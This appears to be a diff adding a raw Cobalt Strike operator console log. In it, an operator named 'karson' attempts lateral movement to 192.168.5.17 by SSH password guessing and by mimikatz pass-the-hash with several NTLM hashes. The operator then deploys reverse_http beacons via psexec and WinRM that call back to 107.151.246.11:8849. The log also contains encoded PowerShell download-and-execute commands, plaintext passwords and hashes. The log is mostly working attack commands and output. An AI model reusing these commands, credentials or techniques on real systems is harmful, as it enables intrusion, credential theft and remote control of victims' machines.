@@ -1,0 +1,204 @@
+02/05 01:43:57 UTC [input] <karson> ssh 192.168.5.17:22 IUSR_INSSRV01 7aDh\u~7r'g%ZQ
+02/05 01:43:57 UTC [task] <T1021, T1093> Tasked beacon to SSH to 192.168.5.17:22 as IUSR_INSSRV01
+02/05 01:43:59 UTC [checkin] host called home, sent: 438883 bytes
+02/05 01:44:00 UTC [error] SSH error: socket disconnect
+02/05 01:45:20 UTC [input] <karson> ssh 192.168.5.17:22 administrator R0yalblood!21
+02/05 01:45:20 UTC [task] <T1021, T1093> Tasked beacon to SSH to 192.168.5.17:22 as administrator
+02/05 01:45:22 UTC [checkin] host called home, sent: 438883 bytes
+02/05 01:45:23 UTC [error] SSH error: socket disconnect
+02/05 01:45:42 UTC [input] <karson> ssh 192.168.5.17:22 FILESERVER\administrator R0yalblood!
+02/05 01:45:43 UTC [task] <T1021, T1093> Tasked beacon to SSH to 192.168.5.17:22 as FILESERVER\administrator
+02/05 01:45:43 UTC [checkin] host called home, sent: 438883 bytes
+02/05 01:45:45 UTC [error] SSH error: socket disconnect
+02/05 01:46:01 UTC [input] <karson> ssh 192.168.5.17:22 admin15 D1versit@
+02/05 01:46:01 UTC [task] <T1021, T1093> Tasked beacon to SSH to 192.168.5.17:22 as admin15
+02/05 01:46:03 UTC [checkin] host called home, sent: 438883 bytes
+02/05 01:46:04 UTC [error] SSH error: socket disconnect
+02/05 01:46:25 UTC [input] <karson> rev2self
+02/05 01:46:25 UTC [task] <T1134> Tasked beacon to revert token
+02/05 01:46:25 UTC [input] <karson> pth INSSRV01\devadmin 91fb7ac0f77462f37133c60d911b87c4
+02/05 01:46:25 UTC [checkin] host called home, sent: 31 bytes
+02/05 01:46:25 UTC [task] <T1075, T1093> Tasked beacon to run mimikatz's sekurlsa::pth /user:devadmin /domain:INSSRV01 /ntlm:91fb7ac0f77462f37133c60d911b87c4 /run:"%COMSPEC% /c echo eb2bd188da5 > \\.\pipe\7b8af4" command
+02/05 01:46:25 UTC [input] <karson> jump psexec 192.168.5.17 2008
+02/05 01:46:25 UTC [checkin] host called home, sent: 253559 bytes
+02/05 01:46:26 UTC [task] <T1035, T1050, T1077> Tasked beacon to run windows/beacon_http/reverse_http (107.151.246.11:8849) on 192.168.5.17 via Service Control Manager (\\192.168.5.17\ADMIN$\2c23e2d.exe)
+02/05 01:46:26 UTC [indicator] service: \\192.168.5.17 2c23e2d
+02/05 01:46:26 UTC [indicator] file: 56d6da6378ed6abf659db10033062aff 291840 bytes \\192.168.5.17\ADMIN$\2c23e2d.exe
+02/05 01:46:27 UTC [output]
+Impersonated NT AUTHORITY\SYSTEM
+
+02/05 01:46:27 UTC [output]
+received output:
+user	: devadmin
+domain	: INSSRV01
+program	: C:\WINDOWS\system32\cmd.exe /c echo eb2bd188da5 > \\.\pipe\7b8af4
+impers.	: no
+NTLM	: 91fb7ac0f77462f37133c60d911b87c4
+  |  PID  5844
+  |  TID  4520
+  |  LSA Process is now R/W
+  |  LUID 2 ; 2243845274 (00000002:85be5c9a)
+  \_ msv1_0   - data copy @ 00C8FC64 : OK !
+  \_ kerberos - data copy @ 0009A608
+   \_ rc4_hmac_nt       OK
+   \_ rc4_hmac_old      OK
+   \_ rc4_md4           OK
+   \_ des_cbc_md5       -> null             
+   \_ des_cbc_crc       -> null             
+   \_ rc4_hmac_nt_exp   OK
+   \_ rc4_hmac_old_exp  OK
+   \_ *Password replace @ 0009A760 (8) -> null
+
+
+02/05 01:46:27 UTC [checkin] host called home, sent: 293869 bytes
+02/05 01:46:27 UTC [error] could not upload file: 5 - ERROR_ACCESS_DENIED
+02/05 01:46:27 UTC [error] Could not open service control manager on 192.168.5.17: 5
+02/05 01:47:04 UTC [input] <karson> rev2self
+02/05 01:47:04 UTC [task] <T1134> Tasked beacon to revert token
+02/05 01:47:04 UTC [checkin] host called home, sent: 8 bytes
+02/05 01:47:04 UTC [input] <karson> pth INSSRV01\IUSR_INSSRV01 b0ab848d889f5d4e466bcf8d28da115f
+02/05 01:47:04 UTC [task] <T1075, T1093> Tasked beacon to run mimikatz's sekurlsa::pth /user:IUSR_INSSRV01 /domain:INSSRV01 /ntlm:b0ab848d889f5d4e466bcf8d28da115f /run:"%COMSPEC% /c echo cafda71f75d > \\.\pipe\731ba6" command
+02/05 01:47:04 UTC [checkin] host called home, sent: 23 bytes
+02/05 01:47:05 UTC [input] <karson> jump psexec 192.168.5.17 2008
+02/05 01:47:05 UTC [checkin] host called home, sent: 253559 bytes
+02/05 01:47:05 UTC [task] <T1035, T1050, T1077> Tasked beacon to run windows/beacon_http/reverse_http (107.151.246.11:8849) on 192.168.5.17 via Service Control Manager (\\192.168.5.17\ADMIN$\deceb0c.exe)
+02/05 01:47:05 UTC [indicator] service: \\192.168.5.17 deceb0c
+02/05 01:47:05 UTC [indicator] file: 51fa2fd54fe7dbda9227720016becd5f 291840 bytes \\192.168.5.17\ADMIN$\deceb0c.exe
+02/05 01:47:07 UTC [output]
+Impersonated NT AUTHORITY\SYSTEM
+
+02/05 01:47:07 UTC [output]
+received output:
+user	: IUSR_INSSRV01
+domain	: INSSRV01
+program	: C:\WINDOWS\system32\cmd.exe /c echo cafda71f75d > \\.\pipe\731ba6
+impers.	: no
+NTLM	: b0ab848d889f5d4e466bcf8d28da115f
+  |  PID  5760
+  |  TID  5020
+  |  LSA Process is now R/W
+  |  LUID 2 ; 2243870779 (00000002:85bec03b)
+  \_ msv1_0   - data copy @ 00C8BEFC : OK !
+  \_ kerberos - data copy @ 0009A920
+   \_ rc4_hmac_nt       OK
+   \_ rc4_hmac_old      OK
+   \_ rc4_md4           OK
+   \_ des_cbc_md5       -> null             
+   \_ des_cbc_crc       -> null             
+   \_ rc4_hmac_nt_exp   OK
+   \_ rc4_hmac_old_exp  OK
+   \_ *Password replace @ 0009A868 (8) -> null
+
+
+02/05 01:47:07 UTC [checkin] host called home, sent: 293869 bytes
+02/05 01:47:07 UTC [error] could not upload file: 1326 - ERROR_LOGON_FAILURE
+02/05 01:47:07 UTC [error] Could not open service control manager on 192.168.5.17: 5
+02/05 01:48:34 UTC [input] <karson> rev2self
+02/05 01:48:34 UTC [task] <T1134> Tasked beacon to revert token
+02/05 01:48:34 UTC [input] <karson> pth INSSRV01\jong c398cbc80d8022ab303a4d1ad1fc6729
+02/05 01:48:34 UTC [checkin] host called home, sent: 31 bytes
+02/05 01:48:34 UTC [task] <T1075, T1093> Tasked beacon to run mimikatz's sekurlsa::pth /user:jong /domain:INSSRV01 /ntlm:c398cbc80d8022ab303a4d1ad1fc6729 /run:"%COMSPEC% /c echo c96019e92cf > \\.\pipe\f43159" command
+02/05 01:48:34 UTC [input] <karson> jump psexec 192.168.5.17 2008
+02/05 01:48:34 UTC [checkin] host called home, sent: 253559 bytes
+02/05 01:48:35 UTC [task] <T1035, T1050, T1077> Tasked beacon to run windows/beacon_http/reverse_http (107.151.246.11:8849) on 192.168.5.17 via Service Control Manager (\\192.168.5.17\ADMIN$\31ff1e4.exe)
+02/05 01:48:35 UTC [indicator] service: \\192.168.5.17 31ff1e4
+02/05 01:48:35 UTC [indicator] file: 62012fa5c90485981dcec7630ec008c7 291840 bytes \\192.168.5.17\ADMIN$\31ff1e4.exe
+02/05 01:48:36 UTC [output]
+Impersonated NT AUTHORITY\SYSTEM
+
+02/05 01:48:36 UTC [output]
+received output:
+user	: jong
+domain	: INSSRV01
+program	: C:\WINDOWS\system32\cmd.exe /c echo c96019e92cf > \\.\pipe\f43159
+impers.	: no
+NTLM	: c398cbc80d8022ab303a4d1ad1fc6729
+  |  PID  6136
+  |  TID  5336
+  |  LSA Process is now R/W
+  |  LUID 2 ; 2243924224 (00000002:85bf9100)
+  \_ msv1_0   - data copy @ 0060FD04 : OK !
+  \_ kerberos - data copy @ 0009A500
+   \_ rc4_hmac_nt       OK
+   \_ rc4_hmac_old      OK
+   \_ rc4_md4           OK
+   \_ des_cbc_md5       -> null             
+   \_ des_cbc_crc       -> null             
+   \_ rc4_hmac_nt_exp   OK
+   \_ rc4_hmac_old_exp  OK
+   \_ *Password replace @ 0009A448 (8) -> null
+
+
+02/05 01:48:36 UTC [checkin] host called home, sent: 293869 bytes
+02/05 01:48:36 UTC [error] could not upload file: 1326 - ERROR_LOGON_FAILURE
+02/05 01:48:36 UTC [error] Could not open service control manager on 192.168.5.17: 5
+02/05 01:49:06 UTC [input] <karson> jump psexec64 192.168.5.17 2008
+02/05 01:49:08 UTC [task] <T1035, T1050, T1077> Tasked beacon to run windows/beacon_http/reverse_http (107.151.246.11:8849) on 192.168.5.17 via Service Control Manager (\\192.168.5.17\ADMIN$\adeb214.exe)
+02/05 01:49:08 UTC [indicator] service: \\192.168.5.17 adeb214
+02/05 01:49:08 UTC [indicator] file: 07f3e69c0d37c6a9c2229afd274ede99 296960 bytes \\192.168.5.17\ADMIN$\adeb214.exe
+02/05 01:49:08 UTC [checkin] host called home, sent: 298989 bytes
+02/05 01:49:08 UTC [error] could not upload file: 1326 - ERROR_LOGON_FAILURE
+02/05 01:49:08 UTC [error] Could not open service control manager on 192.168.5.17: 5
+02/05 01:50:15 UTC [input] <karson> rev2self
+02/05 01:50:15 UTC [task] <T1134> Tasked beacon to revert token
+02/05 01:50:15 UTC [input] <karson> make_token 192.168.5.107\FILESERVER\administrator R0yalblood!
+02/05 01:50:15 UTC [task] <T1134> Tasked beacon to create a token for 192.168.5.107\FILESERVER\administrator
+02/05 01:50:15 UTC [input] <karson> jump winrm 192.168.5.17 2008
+02/05 01:50:15 UTC [checkin] host called home, sent: 76 bytes
+02/05 01:50:15 UTC [output]
+Impersonated NT AUTHORITY\SYSTEM
+
+02/05 01:50:15 UTC [task] <T1028, T1086> Tasked beacon to run windows/beacon_http/reverse_http (107.151.246.11:8849) on 192.168.5.17 via WinRM
+02/05 01:50:16 UTC [checkin] host called home, sent: 202445 bytes
+02/05 01:50:16 UTC [error] could not spawn powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAyADIANAAyADYALwAnACkA (token): 2 - ERROR_FILE_NOT_FOUND
+02/05 01:50:47 UTC [input] <karson> rev2self
+02/05 01:50:47 UTC [task] <T1134> Tasked beacon to revert token
+02/05 01:50:47 UTC [input] <karson> pth INSSRV01\PezaUser fa91468e7f6bf7e1278879fbe633134f
+02/05 01:50:47 UTC [checkin] host called home, sent: 31 bytes
+02/05 01:50:47 UTC [task] <T1075, T1093> Tasked beacon to run mimikatz's sekurlsa::pth /user:PezaUser /domain:INSSRV01 /ntlm:fa91468e7f6bf7e1278879fbe633134f /run:"%COMSPEC% /c echo 5a2625290b2 > \\.\pipe\8f5676" command
+02/05 01:50:47 UTC [input] <karson> jump winrm 192.168.5.17 2008
+02/05 01:50:47 UTC [task] <T1028, T1086> Tasked beacon to run windows/beacon_http/reverse_http (107.151.246.11:8849) on 192.168.5.17 via WinRM
+02/05 01:50:48 UTC [checkin] host called home, sent: 253559 bytes
+02/05 01:50:52 UTC [output]
+Impersonated NT AUTHORITY\SYSTEM
+
+02/05 01:50:52 UTC [output]
+received output:
+user	: PezaUser
+domain	: INSSRV01
+program	: C:\WINDOWS\system32\cmd.exe /c echo 5a2625290b2 > \\.\pipe\8f5676
+impers.	: no
+NTLM	: fa91468e7f6bf7e1278879fbe633134f
+  |  PID  5780
+  |  TID  5028
+  |  LSA Process is now R/W
+  |  LUID 2 ; 2244006845 (00000002:85c0d3bd)
+  \_ msv1_0   - data copy @ 013E693C : OK !
+  \_ kerberos - data copy @ 0009AD40
+   \_ rc4_hmac_nt       OK
+   \_ rc4_hmac_old      OK
+   \_ rc4_md4           OK
+   \_ des_cbc_md5       -> null             
+   \_ des_cbc_crc       -> null             
+   \_ rc4_hmac_nt_exp   OK
+   \_ rc4_hmac_old_exp  OK
+   \_ *Password replace @ 0009AC88 (8) -> null
+
+
+02/05 01:50:56 UTC [checkin] host called home, sent: 202445 bytes
+02/05 01:50:56 UTC [error] could not spawn powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAyADgAMAAwADgALwAnACkA (token): 2 - ERROR_FILE_NOT_FOUND
+02/05 01:51:49 UTC [input] <karson> shell systeminfo
+02/05 01:51:49 UTC [task] <T1059> Tasked beacon to run: systeminfo
+02/05 01:51:52 UTC [checkin] host called home, sent: 41 bytes
+02/05 01:51:52 UTC [error] could not spawn C:\WINDOWS\system32\cmd.exe /C systeminfo (token): 1349 - ERROR_BAD_TOKEN_TYPE
+02/05 01:52:11 UTC [input] <karson> shell whoami
+02/05 01:52:11 UTC [task] <T1059> Tasked beacon to run: whoami
+02/05 01:52:11 UTC [checkin] host called home, sent: 37 bytes
+02/05 01:52:11 UTC [error] could not spawn C:\WINDOWS\system32\cmd.exe /C whoami (token): 1349 - ERROR_BAD_TOKEN_TYPE
+02/05 01:53:38 UTC [input] <karson> shell whoami
+02/05 01:53:38 UTC [task] <T1059> Tasked beacon to run: whoami
+02/05 01:53:38 UTC [checkin] host called home, sent: 37 bytes
+02/05 01:53:38 UTC [error] could not spawn C:\WINDOWS\system32\cmd.exe /C whoami (token): 1349 - ERROR_BAD_TOKEN_TYPE
+02/05 02:15:08 UTC [input] <karson> sleep 5
+02/05 02:15:08 UTC [task] <T1029> Tasked beacon to sleep for 5s
+02/05 02:15:08 UTC [checkin] host called home, sent: 16 bytes
